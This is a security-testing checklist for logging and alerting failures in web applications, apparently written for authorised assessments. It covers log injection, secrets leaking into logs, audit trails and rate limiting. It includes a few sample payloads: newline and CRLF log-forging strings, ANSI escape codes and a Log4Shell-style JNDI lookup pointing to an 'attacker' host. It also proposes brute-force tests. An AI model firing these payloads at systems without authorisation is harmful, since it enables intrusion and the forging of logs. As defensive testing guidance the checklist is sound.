# A09:2025 — Security Logging and Alerting Failures

> Note: This category is primarily observational. Focus on verifiable gaps rather than exploitation.

## Log Injection
- [ ] Inject newline characters in login username field: `admin\nINFO: Admin logged in successfully`
- [ ] Test CRLF injection in logged parameters: `param=value%0d%0a[FORGED] Unauthorized access`
- [ ] Inject ANSI escape codes to manipulate terminal-based log viewers: `\x1b[31mERROR\x1b[0m`
- [ ] Test log injection via User-Agent header (commonly logged)
- [ ] Test log injection via Referer header
- [ ] Inject log4j-style payloads if Java backend suspected: `${jndi:ldap://attacker/a}` (verify safe)

## Sensitive Data in Logs
- [ ] Submit a password and check if it appears in any accessible error/debug output
- [ ] Check if credit card numbers, SSNs, or tokens are echoed in error pages
- [ ] Test if full request bodies (including sensitive fields) appear in stack traces
- [ ] Check for session tokens or API keys in URL parameters (logged by web servers)
- [ ] Verify that password reset tokens in URLs are not persisted in accessible logs

## Missing Audit Trail Checks
- [ ] Trigger failed login (5+ times) — observe if any defensive response occurs (CAPTCHA, lockout, delay)
- [ ] Perform privilege escalation attempts — observe if the account is flagged or rate-limited
- [ ] Test password change without re-authentication — is this logged as a security event?
- [ ] Test admin actions — is there an observable audit trail (audit log endpoint, admin panel)?
- [ ] Verify that account deletion, permission changes, and data exports are logged

## Alerting & Response Gaps
- [ ] Perform brute force attack — does the application respond with any defensive measure?
- [ ] Test rapid sequential requests from different IPs — is there distributed attack detection?
- [ ] Check for WAF/IDS indicators: are common attack payloads blocked or just logged?
- [ ] Test for missing monitoring on admin endpoints — repeated 403s should trigger alerts

## Error Messages Revealing State
- [ ] Check if verbose error messages reveal internal service topology (hostnames, IPs, ports)
- [ ] Check if errors reveal database type, table names, column names
- [ ] Test if errors reveal file paths, class names, or framework versions
- [ ] Verify error messages are consistent — different errors for same input type suggest info leak

## Observable Indicators
- [ ] Check HTTP response headers for security tooling indicators: `X-CDN`, `X-Cache`, WAF headers
- [ ] Look for rate limiting headers: `X-RateLimit-Remaining`, `Retry-After`
- [ ] Check if suspicious activity triggers observable changes: account lock, CAPTCHA appearance
- [ ] Test if the application has a security event log accessible to users (login history, activity log)

## Framework-Specific Checks
- [ ] **Django**: Check `LOGGING` configuration, `DEBUG=True` logging sensitive request data
- [ ] **Rails**: Check `config.filter_parameters` — are passwords and tokens filtered from logs?
- [ ] **Express**: Check if `morgan` or similar middleware logs full request bodies
- [ ] **Spring**: Check `logback`/`log4j2` configuration for sensitive data filtering
- [ ] **Laravel**: Check `LOG_LEVEL` in production, `config/logging.php` channel configuration
- [ ] **Next.js**: Check server-side logging of API route request bodies

---
> Cross-reference skills: `athena-log-investigation`
